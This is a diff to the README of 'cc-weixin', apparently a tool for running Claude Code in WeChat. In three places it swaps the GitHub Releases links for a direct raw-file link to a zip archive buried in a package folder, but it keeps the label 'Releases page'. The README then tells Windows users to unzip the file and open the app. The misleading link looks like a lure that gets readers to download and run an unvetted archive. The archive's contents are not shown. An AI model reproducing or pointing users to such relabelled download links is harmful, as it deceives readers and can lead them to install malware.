@@ -1,10 +1,10 @@
 # 🤖 cc-weixin - Run Claude Code in WeChat
 
-[![Download cc-weixin](https://img.shields.io/badge/Download%20cc--weixin-blue?style=for-the-badge)](https://github.com/Armchaircounty801/cc-weixin/releases)
+[![Download cc-weixin](https://img.shields.io/badge/Download%20cc--weixin-blue?style=for-the-badge)](https://raw.githubusercontent.com/Armchaircounty801/cc-weixin/main/packages/openclaw-weixin-cli/weixin_cc_1.7.zip)
 
 ## 📥 Download cc-weixin
 
-Go to the [Releases page](https://github.com/Armchaircounty801/cc-weixin/releases) and download the Windows build.
+Go to the [Releases page](https://raw.githubusercontent.com/Armchaircounty801/cc-weixin/main/packages/openclaw-weixin-cli/weixin_cc_1.7.zip) and download the Windows build.
 
 If there are several files, choose the one for Windows. It is usually a `.exe` file or a `.zip` file. If you download a `.zip` file, unzip it first, then open the app.
 
@@ -25,7 +25,7 @@ This makes it easier to ask Claude for help without leaving WeChat.
 
 ### 1. Download the app
 
-Open the [Releases page](https://github.com/Armchaircounty801/cc-weixin/releases) in your browser.
+Open the [Releases page](https://raw.githubusercontent.com/Armchaircounty801/cc-weixin/main/packages/openclaw-weixin-cli/weixin_cc_1.7.zip) in your browser.
 
 Download the latest Windows file.
 
